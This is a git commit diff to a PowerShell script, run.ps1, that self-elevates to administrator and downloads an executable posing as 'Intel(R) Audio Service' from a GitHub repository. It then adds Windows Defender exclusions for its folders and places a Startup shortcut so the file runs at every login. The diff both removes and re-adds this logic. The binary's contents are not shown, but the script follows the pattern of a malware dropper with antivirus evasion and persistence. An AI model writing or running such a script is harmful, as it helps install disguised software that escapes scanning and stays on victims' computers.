7f420b512838c3a42c9f56f008def996393d8e9f
B95segal <193628847+B95segal@users.noreply.github.com>
2025-01-06 05:55:25 +1100

    recompile

--- run.ps1
+++ run.ps1
@@ -2,45 +2,34 @@
 # Self-elevate the script if required
 if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
       if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
-       $CommandLine = "-File "" + $MyInvocation.MyCommand.Path + "" " + $MyInvocation.UnboundArguments
-       Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
-      #  Exit
+            $CommandLine = "-NoExit -c cd '$pwd'; & `"" + $MyInvocation.MyCommand.Path + "`""
+            Start-Process powershell -Verb runas -ArgumentList $CommandLine
+            Exit
       }
-     }
-     
-     # Remainder of script here
-     Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
-      $WScriptShell = New-Object -ComObject WScript.Shell
-      $FolderPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-      $ShortcutFile = "$FolderPath\Intel Audio Service.lnk"
-      $TargetPath = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service"
-      $TargetFile = "$TargetPath\Intel Audio Service.exe"
-      
-      If(!(Test-Path $FolderPath)) {
-            New-Item -ItemType Directory -Force -Path $FolderPath
-            Write-Output "Shortcut folder created"
-      }
+}
+  
+#Elevated script content after that
+$WScriptShell = New-Object -ComObject WScript.Shell
+$FolderPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+$ShortcutFile = "$FolderPath\Intel(R) Audio Service.lnk"
+$TargetPath = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel(R) Audio Service"
+$TargetFile = "$TargetPath\Intel(R) Audio Service.exe"
 
-      if (!(test-path $TargetPath)) {
-            New-Item -ItemType Directory -Force -Path $TargetPath
-            Write-Output "Target folder created"
-            Add-MpPreference -ExclusionPath $FolderPath
-            Add-MpPreference -ExclusionPath $TargetPath
-            Write-Output "Exclusions added"
-      }
-
-      if (!(test-path $TargetFile)) {
-            Invoke-WebRequest -Uri "https://github.com/B95segal/intelaudioservice/blob/main/dist/Intel Audio Service.exe" -OutFile $TargetFile
-            Write-Output "File downloaded"
-      }
-
-
-      $Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
-      $Shortcut.TargetPath = $TargetFile
-      $Shortcut.WorkingDirectory = $TargetPath
-      $Shortcut.IconLocation = "$TargetPath\Intel Audio Service.exe,0"
-      $Shortcut.Save()
-      Write-Output "Shortcut created"
+New-Item -ItemType Directory -Force -Path $FolderPath
+Write-Output "Shortcut folder created"
+New-Item -ItemType Directory -Force -Path $TargetPath
+Write-Output "Target folder created"
+Invoke-WebRequest -Uri "https://github.com/B95segal/intelaudioservice/blob/main/dist/Intel(R) Audio Service.exe" -OutFile $TargetFile
+Write-Output "File downloaded"
+Add-MpPreference -ExclusionPath $FolderPath
+Add-MpPreference -ExclusionPath $TargetPath
+Write-Output "Exclusions added"
+$Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
+$Shortcut.TargetPath = $TargetFile
+$Shortcut.WorkingDirectory = $TargetPath
+$Shortcut.IconLocation = "$TargetPath\Intel(R) Audio Service.exe,0"
+$Shortcut.Save()
+Write-Output "Shortcut created"
       
 
-      # Restart-Computer -Force
+# Restart-Computer -Force
